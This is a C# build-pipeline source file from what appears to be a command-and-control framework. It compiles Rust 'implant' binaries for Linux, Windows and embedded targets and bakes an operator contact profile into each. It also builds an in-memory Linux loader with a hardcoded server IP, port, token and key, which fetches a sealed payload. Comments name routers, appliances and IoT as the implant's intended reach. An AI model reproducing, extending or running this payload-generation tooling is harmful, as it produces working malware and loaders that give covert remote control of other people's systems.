using System.Diagnostics;
using Rod.CoreState.Implants;

namespace Rod.BuildPipeline.PayloadBuild;

/// <summary>
/// The Rust build unit: drives cargo against the Rust reference implant tree
/// through the same build contract the .NET unit serves (architecture.md
/// Sec 6, Sec 12.2). The unit copies the tree into a per-build staging dir,
/// overwrites the checked-in baked-profile stub with the per-artifact profile
/// (the same base64url JSON the .NET unit bakes, the language-neutral wire
/// contract), and compiles a release binary for the requested target
/// triple. Rust is always native code: the executable formats are synonyms
/// here (the size posture lives in the crate's release profile -- opt-level,
/// LTO, strip); the shared-library and shellcode spellings are contract
/// slots refused until the toolchain that produces them lands. Loader-tier
/// requests compile the no_std crate beside the implant instead, baked with
/// fetch constants rather than a contact profile.
/// </summary>
/// <remarks>
/// The transport and handler trims the .NET unit applies have Rust
/// equivalents ahead: transport selection and verb trimming will ride cargo
/// features (compile only the contact clients and handlers the bake dials),
/// and the Windows-sensitive verbs already self-gate on <c>cfg(windows)</c>
/// so a Linux build compiles none of them.
///
/// Build failures throw <see cref="BuildUnitFailureException"/> (a
/// server-side fault: the toolchain, the source tree, or the host is wrong)
/// while contract refusals -- retired classes and formats, unsupported
/// target triples -- throw <see cref="InvalidOperationException"/> (the
/// request is wrong). Set <c>ROD_RUST_TARGET_DIR</c> to point builds at a
/// shared, persistent cargo target dir and reuse dependency compilation
/// across builds.
/// </remarks>
public sealed class RustBuildUnit : IBuildUnit, IBuildUnitEnvironment
{
    // The live knob holder (the settings page's build section); null keeps
    // the environment-variable boot shape for direct constructions.
    private readonly IBuildRuntimeSettings? _settings;

    // Every target the contract can map (MapTriple), with the C linker its
    // platform pieces need on the build host: the musl triples get the
    // cross names the build itself sets as CC_*/AR_* (ring's primitives),
    // the Windows GNU pair the mingw-w64 drivers cargo invokes by default.
    // A target without its row here still builds; the table exists so the
    // environment report can name what is missing per target.
    private static readonly (string Triple, string Os, string Arch, string Linker)[] CrossTargets =
    [
        ("x86_64-unknown-linux-musl", "linux", "amd64", "musl-gcc"),
        ("aarch64-unknown-linux-musl", "linux", "arm64", "aarch64-linux-musl-gcc"),
        ("armv7-unknown-linux-musleabihf", "linux", "arm", "armv7-linux-musleabihf-gcc"),
        ("i686-unknown-linux-musl", "linux", "x86", "musl-gcc"),
        ("x86_64-pc-windows-gnu", "windows", "amd64", "x86_64-w64-mingw32-gcc"),
        ("i686-pc-windows-gnu", "windows", "x86", "i686-w64-mingw32-gcc"),
    ];

    private readonly string _rustSourceDir;
    private readonly string _cargoBinary;
    private readonly string? _sharedTargetDir;

    public Language Language => Language.Rust;

    public RustBuildUnit(
        string? rustSourceDir = null,
        string? cargoBinary = null,
        IBuildRuntimeSettings? settings = null)
    {
        _rustSourceDir = string.IsNullOrWhiteSpace(rustSourceDir)
            ? ResolveDefaultRustSourceDir()
            : rustSourceDir;
        _cargoBinary = cargoBinary ?? "cargo";
        _settings = settings;
        // The environment variable is the boot default a service unit sets;
        // a live setting (persisted operator change) outranks it per build.
        _sharedTargetDir = NonEmptyOrNull(Environment.GetEnvironmentVariable("ROD_RUST_TARGET_DIR"));
    }

    // The cache the next build uses: the live setting when one is held,
    // else the environment boot default; null stays hermetic.
    private string? SharedTargetDir => _settings?.RustTargetDir ?? _sharedTargetDir;

    private static string? NonEmptyOrNull(string? value)
        => string.IsNullOrWhiteSpace(value) ? null : value;

    /// <summary>
    /// Probes the host: cargo and rustc by running their version queries,
    /// the source and proto trees by existence, the installed std set by
    /// walking rustc's sysroot, and each cross linker by a PATH scan. The
    /// findings name the fix for everything not "ok" -- a build that fails
    /// inside a missing toolchain wastes minutes saying less.
    /// </summary>
    public BuildUnitEnvironmentReport ReportEnvironment()
    {
        var findings = new List<BuildEnvironmentFinding>
        {
            new("ok", "source tree", $"Rust implant crate at '{_rustSourceDir}'"),
        };
        var sourceMissing = !Directory.Exists(_rustSourceDir);
        if (sourceMissing)
            findings[0] = new("missing", "source tree",
                $"Rust implant source tree not found at '{_rustSourceDir}' -- set Build:RustSourceDirectory to the crate's location");

        var proto = LocateProtoDir();
        findings.Add(proto is null
            ? new("missing", "proto tree",
                "The teamserver proto tree (src/teamserver/Rod.Protocol/protos) was not found beside the crate "
                + "-- the wire contract's source is part of the build, not the binary")
            : new("ok", "proto tree", $"rod.proto located at '{proto}'"));

        var cargo = Probe.Run(_cargoBinary, "--version");
        findings.Add(cargo.Found
            ? new("ok", "cargo", cargo.FirstLine)
            : new("missing", "cargo",
                $"'{_cargoBinary}' was not found on PATH -- every build fails until the Rust toolchain is installed"));

        // The installed std set reads off rustc's sysroot (one directory per
        // target, host included), which works for rustup-managed and distro
        // toolchains alike; rustup's own list is a rustup-only view.
        var sysroot = Probe.Run("rustc", "--print", "sysroot");
        var stdRoot = sysroot.Found
            ? Path.Combine(sysroot.FirstLine.Trim(), "lib", "rustlib")
            : null;
        var installed = stdRoot is not null && Directory.Exists(stdRoot)
            ? Directory.EnumerateDirectories(stdRoot)
                .Select(Path.GetFileName)
                .Where(name => name is not null && !name.Equals("rustlib-src", StringComparison.Ordinal))
                .ToHashSet(StringComparer.Ordinal)!
            : [];
        findings.Add(sysroot.Found
            ? new("ok", "rustc", $"std for {installed.Count} target(s) under '{stdRoot}'")
            : new("warn", "rustc",
                "rustc was not found on PATH -- target readiness below is unverified (cargo may still be a distro install that names it differently)"));

        var targets = new List<BuildTargetReadiness>();
        var anyTargetMissing = false;
        foreach (var (triple, os, arch, linker) in CrossTargets)
        {
            var std = installed.Contains(triple);
            var hasLinker = FindOnPath(linker);
            if (!std || !hasLinker)
                anyTargetMissing = true;
            targets.Add(new BuildTargetReadiness(triple, $"{os}/{arch}", std, hasLinker, linker));
        }

        findings.Add(SharedTargetDir is null
            ? new("warn", "build cache",
                "no shared cargo target dir -- builds are hermetic, so every cold cross-compile pays the full dependency build; "
                + "set the build cache on the Settings page (or the ROD_RUST_TARGET_DIR variable at boot) to share a warm cache "
                + "(concurrent builds queue on cargo's lock)")
            : new("ok", "build cache",
                $"shared cargo target dir '{SharedTargetDir}' (adjustable on the Settings page)"));

        var unavailable = sourceMissing || proto is null || !cargo.Found;
        var status = unavailable ? "unavailable" : anyTargetMissing ? "partial" : "ready";
        return new BuildUnitEnvironmentReport(Language.ToString(), status, findings, targets);
    }

    // The proto tree's location, without the build's copying: the same
    // walk-up ResolveEndpointAsync-style search CopyProtoTree performs,
    // factored so both the build and the environment report agree on where
    // it should be.
    private static string? LocateProtoDir()
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        while (dir is not null)
        {
            var protoDir = Path.Combine(dir.FullName, "src", "teamserver", "Rod.Protocol", "protos");
            if (Directory.Exists(protoDir))
                return protoDir;
            dir = dir.Parent!;
        }
        return null;
    }

    // A PATH scan for an executable by name: presence-level only (an
    // unset execute bit still reads present), the bar a diagnostics page
    // needs -- the build itself remains the final judge.
    private static bool FindOnPath(string name)
    {
        var path = Environment.GetEnvironmentVariable("PATH");
        if (string.IsNullOrEmpty(path))
            return false;
        foreach (var dir in path.Split(Path.PathSeparator))
        {
            if (dir.Length == 0)
                continue;
            try
            {
                if (File.Exists(Path.Combine(dir, name)))
                    return true;
            }
            catch
            {
                // An unreadable PATH entry is not a verdict.
            }
        }
        return false;
    }

    // A bounded one-shot process run for version/sysroot queries: found
    // means it started and exited zero, and the first line carries the
    // answer the report shows.
    private static class Probe
    {
        public static (bool Found, string FirstLine) Run(string binary, params string[] arguments)
        {
            try
            {
                var start = new ProcessStartInfo
                {
                    FileName = binary,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                };
                foreach (var argument in arguments)
                    start.ArgumentList.Add(argument);
                using var timeout = new CancellationTokenSource(TimeSpan.FromSeconds(3));
                using var process = Process.Start(start);
                if (process is null)
                    return (false, "");
                var output = process.StandardOutput.ReadToEndAsync(timeout.Token);
                try
                {
                    process.WaitForExitAsync(timeout.Token).GetAwaiter().GetResult();
                }
                catch (OperationCanceledException)
                {
                    try { process.Kill(entireProcessTree: true); } catch { }
                    return (false, "");
                }
                if (process.ExitCode != 0)
                    return (false, "");
                var first = (output.IsCompletedSuccessfully ? output.Result : "")
                    .Split('\n', 2)[0].Trim();
                return (true, first);
            }
            catch
            {
                // A probe never throws: not-found is an answer, not a fault.
                return (false, "");
            }
        }
    }

    public async Task<BuildArtifact> BuildAsync(BuildParams @params, CancellationToken cancellationToken = default)
    {
        if (@params.Format is ArtifactFormat.Dll or ArtifactFormat.SharedObject or ArtifactFormat.Shellcode)
            throw new InvalidOperationException(
                $"The '{@params.Format.ToString().ToLowerInvariant()}' format is a contract slot the in-tree Rust unit does not produce yet; build 'exe' or 'aot'.");
        if (!Directory.Exists(_rustSourceDir))
            throw new BuildUnitFailureException($"Rust implant source tree not found at '{_rustSourceDir}'.");

        var triple = MapTriple(@params.Target);

        var workDir = Path.Combine(Path.GetTempPath(), "rod-rust-build-" + Guid.NewGuid().ToString("N"));
        // The staging copy mirrors the crate's real repo layout: build.rs
        // references the teamserver proto at ../../teamserver/... relative to
        // the crate dir, so the copy sits at <work>/src/implant/rust with the
        // proto at <work>/src/teamserver/Rod.Protocol/protos -- the same
        // relative dance the .NET unit performs for its csproj's proto
        // reference.
        var stagingDir = Path.Combine(workDir, "src", "implant", "rust");
        // Hermetic by default: a per-build target dir under the disposable
        // work dir. ROD_RUST_TARGET_DIR opts a deployment into a shared,
        // persistent dir instead: every registry dependency's compiled
        // artifacts are reused across builds (only the implant crate itself
        // recompiles, since its staging path is per-build), which turns a
        // cold full cross-compile into a one-time cost. Concurrent builds
        // through a shared dir queue on cargo's own target-dir lock -- they
        // wait, not fail.
        var targetDir = SharedTargetDir ?? Path.Combine(workDir, "target");
        try
        {
            CopyTree(_rustSourceDir, stagingDir);
            CopyProtoTree(_rustSourceDir, workDir);

            // The loader tier branches before the implant bake: its artifact
            // is the no_std crate beside the implant, baked with fetch
            // constants rather than a contact profile.
            if (@params.Kind == PayloadKind.Loader)
                return await BuildLoaderAsync(@params, triple, stagingDir, targetDir, cancellationToken);

            // The bake: the same base64url profile JSON every unit emits --
            // one language-neutral contract, decoded identically by every
            // implant.
            var baked = ProfileBake.Render(@params);

            // Overwrite the checked-in baked.rs stub with the per-build
            // profile, the same mechanism the .NET trees' BakedProfile uses.
            var bakedPath = Path.Combine(stagingDir, "src", "baked.rs");
            await File.WriteAllTextAsync(
                bakedPath,
                "// <auto-generated> Generated by Rod.RustBuildUnit at build time.\n"
                    + "// The per-artifact profile, baked in at generation (architecture.md Sec 5.1),\n"
                    + "// base64url JSON with the same keys every build unit emits.\n"
                    + "pub const PROFILE: &str = \"" + baked + "\";\n",
                cancellationToken);

            // A per-build target dir keeps builds hermetic (the shared cargo
            // home and registry cache stay warm across builds).
            var arguments = new List<string> { "build", "--release", "--target", triple };
            var cargo = new ProcessStartInfo
            {
                FileName = _cargoBinary,
                WorkingDirectory = stagingDir,
                UseShellExecute = false,
                RedirectStandardError = true,
                RedirectStandardOutput = true,
            };
            foreach (var argument in arguments)
                cargo.ArgumentList.Add(argument);
            cargo.Environment["CARGO_TARGET_DIR"] = targetDir;
            cargo.Environment["CARGO_NET_GIT_FETCH_WITH_CLI"] = "true";
            // The static (musl) triples: rust ships their std, and the C
            // bits -- ring's primitives -- need a musl cross compiler the
            // build host names per target. A host without the cross fails
            // inside cargo with the toolchain's own error, loudly.
            if (triple.EndsWith("-musl", StringComparison.Ordinal))
            {
                var envStem = triple.Replace('-', '_').ToUpperInvariant();
                var prefix = triple.Split('-')[0] switch
                {
                    "x86_64" => "musl-gcc",
                    "aarch64" => "aarch64-linux-musl-gcc",
                    "armv7" => "armv7-linux-musleabihf-gcc",
                    _ => "musl-gcc",
                };
                cargo.Environment[$"CC_{envStem}"] = prefix;
                cargo.Environment[$"AR_{envStem}"] = prefix.Replace("gcc", "ar");
            }
            var result = await RunAsync(cargo, cancellationToken);
            if (result.ExitCode != 0)
            {
                var diag = result.Stdout;
                if (result.Stderr.Length > 0)
                    diag = (diag.Length > 0 ? diag + "\n" : "") + result.Stderr;
                throw new BuildUnitFailureException(
                    $"cargo build failed (exit {result.ExitCode}):\n{diag}");
            }

            var binaryName = triple.StartsWith("windows", StringComparison.Ordinal)
                ? "rod-implant.exe"
                : "rod-implant";
            var binaryPath = Path.Combine(targetDir, triple, "release", binaryName);
            if (!File.Exists(binaryPath))
                throw new BuildUnitFailureException(
                    $"cargo reported success but produced no {binaryName} for {triple}.");

            var content = await File.ReadAllBytesAsync(binaryPath, cancellationToken);
            return BuildArtifact.Of(
                Language,
                artifactId: Guid.NewGuid(),
                @params,
                content,
                contentType: "application/octet-stream",
                builtAt: DateTimeOffset.UtcNow);
        }
        finally
        {
            try { Directory.Delete(workDir, recursive: true); }
            catch { /* best-effort; temp dir is disposable */ }
        }
    }

    // The loader tier's build: bakes the fetch constants into the no_std
    // crate beside the implant and compiles rod-loader for the target. The
    // artifact id is minted here, before cargo runs, because the fetch path
    // the loader bakes names it -- the recorded payload id and the baked
    // route must be the same guid by construction. The seal key pair rides
    // the params exactly as the envelope pair does on an implant build (the
    // endpoint minted it unconditionally for this kind); a request that
    // reaches this depth without one is a contract violation, refused
    // rather than baked as a loader that can never open its delivery.
    private async Task<BuildArtifact> BuildLoaderAsync(
        BuildParams @params,
        string triple,
        string stagingDir,
        string targetDir,
        CancellationToken cancellationToken)
    {
        if (!triple.Contains("-linux-", StringComparison.Ordinal))
            throw new InvalidOperationException(
                "The loader is a Linux memfd shape; build it against a linux target.");
        if (@params.TokenSecret is not { } token)
            throw new InvalidOperationException(
                "A loader build bakes a deploy token; the transport layer must mint one.");
        if (@params.EnvelopeKeyId is not { } keyId || @params.EnvelopeKey is not { } key)
            throw new InvalidOperationException(
                "A loader build's delivery seal key must ride the build params (minted beside the token).");
        if (@params.DeliversPayloadId is null)
            throw new InvalidOperationException(
                "A loader build names the stored payload it delivers.");
        var (host, port) = ParseLoaderDial(@params.Transport.Endpoint);

        // The bake: plain consts, the loader crate's whole contract. The
        // fetch path names this artifact's own id -- the loader payload
        // route serves the delivered payload sealed under the key above.
        var artifactId = Guid.NewGuid();
        var baked =
            "// <auto-generated> Generated by Rod.RustBuildUnit at build time.\n"
            + "// The loader's fetch constants: the dial, the credential, and the\n"
            + "// delivery seal (architecture.md Sec 6, the loader tier).\n"
            + "pub const HOST: [u8; 4] = [" + string.Join(", ", host.Select(b => b.ToString())) + "];\n"
            + $"pub const PORT: u16 = {port};\n"
            + $"pub const PATH: &str = \"/implants/loaders/{artifactId:N}/payload\";\n"
            + $"pub const TOKEN: &str = \"{token}\";\n"
            + "pub const KEY_ID: [u8; 16] = ["
            + string.Join(", ", keyId.ToByteArray().Select(b => b.ToString())) + "];\n"
            + "pub const KEY: [u8; 32] = [" + string.Join(", ", key.Select(b => b.ToString())) + "];\n";
        var loaderDir = Path.Combine(stagingDir, "loader");
        if (!Directory.Exists(loaderDir))
            throw new BuildUnitFailureException(
                $"The loader crate was not found beside the implant at '{loaderDir}'.");
        await File.WriteAllTextAsync(
            Path.Combine(loaderDir, "src", "baked.rs"),
            baked,
            cancellationToken);

        var arguments = new List<string> { "build", "--release", "--target", triple };
        var cargo = new ProcessStartInfo
        {
            FileName = _cargoBinary,
            WorkingDirectory = loaderDir,
            UseShellExecute = false,
            RedirectStandardError = true,
            RedirectStandardOutput = true,
        };
        foreach (var argument in arguments)
            cargo.ArgumentList.Add(argument);
        cargo.Environment["CARGO_TARGET_DIR"] = targetDir;
        cargo.Environment["CARGO_NET_GIT_FETCH_WITH_CLI"] = "true";
        var result = await RunAsync(cargo, cancellationToken);
        if (result.ExitCode != 0)
        {
            var diag = result.Stdout;
            if (result.Stderr.Length > 0)
                diag = (diag.Length > 0 ? diag + "\n" : "") + result.Stderr;
            throw new BuildUnitFailureException(
                $"cargo build failed for the loader (exit {result.ExitCode}):\n{diag}");
        }

        var binaryPath = Path.Combine(targetDir, triple, "release", "rod-loader");
        if (!File.Exists(binaryPath))
            throw new BuildUnitFailureException(
                $"cargo reported success but produced no rod-loader for {triple}.");

        var content = await File.ReadAllBytesAsync(binaryPath, cancellationToken);
        return BuildArtifact.Of(
            Language,
            artifactId,
            @params,
            content,
            contentType: "application/octet-stream",
            builtAt: DateTimeOffset.UtcNow);
    }

    // The loader's baked dial: the four address bytes and the port of a
    // cleartext http authority. The parser guarantees the shape; this read
    // is the unit's own refusal of anything that slipped through (a front
    // repointed between parse and build, say) rather than a bake of a dial
    // the loader cannot parse.
    private static (byte[] Host, int Port) ParseLoaderDial(string endpoint)
    {
        var trimmed = endpoint.Trim();
        if (!trimmed.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
            throw new InvalidOperationException(
                $"The loader dials a cleartext http front; '{endpoint}' is not one.");
        var authority = trimmed[7..].Split('/')[0];
        var colon = authority.LastIndexOf(':');
        var host = colon >= 0 ? authority[..colon] : authority;
        var port = 80;
        if (colon >= 0 && (!int.TryParse(authority[(colon + 1)..], out port) || port is < 1 or > 65535))
            throw new InvalidOperationException(
                $"The loader dial's port must be numeric; '{endpoint}' is not one.");
        if (!System.Net.IPAddress.TryParse(host, out var parsed)
            || parsed.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork)
            throw new InvalidOperationException(
                $"The loader dials a literal IPv4; '{host}' is not one.");
        return (parsed.GetAddressBytes(), port);
    }

    // Maps the contract's os/arch pairs onto Rust target triples. Linux is
    // musl everywhere -- the static, runtime-free deployment shape that is
    // the reach implant's whole point (routers, appliances, IoT); measured
    // x86_64: 2.25 MB fully static. Apple targets need the Apple SDK a
    // Linux build host does not carry, and ARM Windows has no GNU target, so
    // both refuse with the supported set named rather than failing inside
    // cargo with a less fixable error. The ARM musl triples map too; they
    // build once the host carries their cross toolchains.
    public static string MapTriple(TargetProfile target)
    {
        var os = target.OperatingSystem.Trim().ToLowerInvariant();
        var arch = target.Architecture.Trim().ToLowerInvariant();
        return (os, arch) switch
        {
            ("linux", "amd64" or "x64" or "x86_64") => "x86_64-unknown-linux-musl",
            ("linux", "arm64" or "aarch64") => "aarch64-unknown-linux-musl",
            ("linux", "arm" or "armv7") => "armv7-unknown-linux-musleabihf",
            ("linux", "x86" or "386") => "i686-unknown-linux-musl",
            ("windows" or "win", "amd64" or "x64" or "x86_64") => "x86_64-pc-windows-gnu",
            ("windows" or "win", "x86" or "386") => "i686-pc-windows-gnu",
            ("osx" or "darwin" or "macos", _) => throw new InvalidOperationException(
                "The Rust build unit does not cross Apple targets (the link needs the Apple SDK); build on a macOS host."),
            ("windows" or "win", "arm64" or "aarch64") => throw new InvalidOperationException(
                "The Rust build unit has no GNU target for ARM Windows."),
            _ => throw new InvalidOperationException(
                $"Unsupported target '{target.OperatingSystem}/{target.Architecture}' for the Rust build unit " +
                "(supported: linux amd64/arm64/arm/x86, windows amd64/x86)."),
        };
    }

    // Recursively copies the crate, skipping target/ (cargo's build output)
    // so a stale build never leaks in. Cargo.lock rides along: the lock pins
    // the dependency set, keeping per-build compiles reproducible.
    private static void CopyTree(string source, string destination)
    {
        Directory.CreateDirectory(destination);
        foreach (var entry in Directory.EnumerateFileSystemEntries(source))
        {
            var name = Path.GetFileName(entry);
            if (name is "target")
                continue;
            var to = Path.Combine(destination, name);
            if (Directory.Exists(entry))
                CopyTree(entry, to);
            else
                File.Copy(entry, to, overwrite: true);
        }
    }

    // Copies the teamserver proto tree into the work dir under the same
    // relative path build.rs references it by (../../teamserver/... from the
    // crate dir). The proto is the wire contract's single source of truth;
    // rod.proto has no imports, so the directory holds all it needs.
    private static void CopyProtoTree(string rustSourceDir, string workDir)
    {
        var protoDir = LocateProtoDir();
        if (protoDir is null)
            throw new BuildUnitFailureException(
                "The Rust build needs the teamserver proto tree (src/teamserver/Rod.Protocol/protos) beside the crate; the repo walk-up found none.");
        var to = Path.Combine(workDir, "src", "teamserver", "Rod.Protocol", "protos");
        Directory.CreateDirectory(to);
        foreach (var file in Directory.EnumerateFiles(protoDir))
            File.Copy(file, Path.Combine(to, Path.GetFileName(file)), overwrite: true);
    }

    private static async Task<(int ExitCode, string Stdout, string Stderr)> RunAsync(
        ProcessStartInfo start, CancellationToken cancellationToken)
    {
        using var process = new Process { StartInfo = start };
        if (!process.Start())
            throw new BuildUnitFailureException($"Failed to start cargo ('{start.FileName}').");
        var stdout = process.StandardOutput.ReadToEndAsync(cancellationToken);
        var stderr = process.StandardError.ReadToEndAsync(cancellationToken);
        try
        {
            await process.WaitForExitAsync(cancellationToken);
        }
        catch (OperationCanceledException)
        {
            try { process.Kill(entireProcessTree: true); } catch { }
            throw;
        }
        return (process.ExitCode, await stdout, await stderr);
    }

    private static string ResolveDefaultRustSourceDir()
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        while (dir is not null)
        {
            if (Directory.Exists(Path.Combine(dir.FullName, "src", "implant", "rust"))
                && Directory.Exists(Path.Combine(dir.FullName, "src", "teamserver")))
                return Path.Combine(dir.FullName, "src", "implant", "rust");
            dir = dir.Parent;
        }
        return Path.Combine("..", "..", "..", "..", "..", "src", "implant", "rust");
    }
}
